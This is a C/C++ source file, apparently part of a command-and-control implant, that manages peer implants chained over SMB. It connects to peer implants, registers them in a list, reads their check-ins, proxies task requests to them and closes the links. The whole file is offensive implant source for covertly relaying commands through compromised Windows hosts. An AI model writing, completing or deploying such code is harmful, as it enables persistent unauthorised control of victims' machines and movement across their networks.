#include "Implant.h"
#include "Peer.h"
#include <stdio.h>

LIST_ENTRY g_PeerList;

static PPEER_IMPLANT PeerpGetImplant( DWORD ID ) {
    LIST_ENTRY* Current = g_PeerList.Flink;

    while (Current != &g_PeerList) {
        PPEER_IMPLANT Peer = CONTAINING_RECORD( Current, PEER_IMPLANT, ListEntry );

        if (Peer->ID == ID) {
            return Peer;
        }

        Current = Current->Flink;
    }

    return NULL;
}

BOOL PeerConnect( DWORD Type, PVOID* Context, PVOID* Checkin, DWORD* CheckinSize, VOID* Config, DWORD ConfigSize ) {

    // P2P/SMB implant
    if (Type == PEER_TYPE_SMB) {

        // Connect to peer smb implant
        if (!SmbConnect( (PEER_SMB_CONTEXT**)Context, Config, ConfigSize )) {
            printf( "Failed to connect to peer smb implant\n" );
            return FALSE;
        }

        if (!SmbRead( *(PEER_SMB_CONTEXT**)Context, Checkin, CheckinSize )) {
            printf( "Failed to read peer implant chekcin \n" );
            return FALSE;
        }
    } else {
        printf( "Peer implant type ( %ld ) not supported\n", Type );
        return FALSE;
    }

    return TRUE;
}

BOOL PeerRegister( DWORD Type, DWORD ID, PVOID Context ) {
    PEER_IMPLANT* Peer     = NULL;
    VOID*         Data     = NULL;
    DWORD         DataSize = NULL;

    // Allocate and Initialize peer implant object
    Peer = (PEER_IMPLANT*)LocalAlloc( LMEM_ZEROINIT, sizeof( PEER_IMPLANT ) );
    if (!Peer) {
        printf( "LocalAlloc failed ( %ld )\n", GetLastError() );
        return FALSE;
    }

    printf( "[*] Successfuly Registered Peer Implant: %lX\n", ID );

    Peer->ID      = ID;
    Peer->Context = Context;
    Peer->Type    = Type;
    InsertTailList( &g_PeerList, &Peer->ListEntry );
    return TRUE;
}

BOOL PeerRead( DWORD ID, VOID** Data, DWORD* Size ) {
    PPEER_IMPLANT Peer = NULL;

    // get peer implant object
    Peer = PeerpGetImplant( ID );
    if (!Peer) {
        printf( "Peer implant ( %lX ) not found\n", ID );
        return FALSE;
    }

    if (Peer->Type == PEER_TYPE_SMB) {
        if (!SmbRead( (PEER_SMB_CONTEXT*)Peer->Context, Data, Size )) {
            printf( "Failed to read response from peer implant ( %lX )\n", ID );
            return FALSE;
        }
    }

    printf( "Read response from peer implant ( %lX )\n", ID );
    return TRUE;
}

BOOL PeerRequest( DWORD ID, VOID* Data, DWORD Size ) {
    json          Request = json::array();
    PPEER_IMPLANT Peer    = NULL;

    // get peer implant object
    Peer = PeerpGetImplant( ID );
    if (!Peer) {
        printf( "Peer implant ( %lX ) not found\n", ID );
        return FALSE;
    }

    if (Peer->Type == PEER_TYPE_SMB) {
        Request = json::parse( (CHAR*)Data, (CHAR*)Data + Size );
        if (!SmbRequest( (PEER_SMB_CONTEXT*)Peer->Context, Data, Size )) {
            printf( "Failed to send request to peer implant ( %lX )\n", ID );
            return FALSE;
        }
    }

    printf( "Proxy task request to peer implant ( %lX )\n", ID );
    return TRUE;
}

BOOL PeerClose( DWORD ID ) {
    PPEER_IMPLANT Peer = NULL;

    // get peer implant object
    Peer = PeerpGetImplant( ID );
    if (!Peer) {
        printf( "Peer implant ( %lX ) not found\n", ID );
        return FALSE;
    }

    if (Peer->Type == PEER_TYPE_SMB) {
        SmbClose( (PEER_SMB_CONTEXT*)Peer->Context );
    }

    // Remove it from list
    RemoveEntryList( &Peer->ListEntry );

    // Free object
    LocalFree( Peer );

    return TRUE;
}
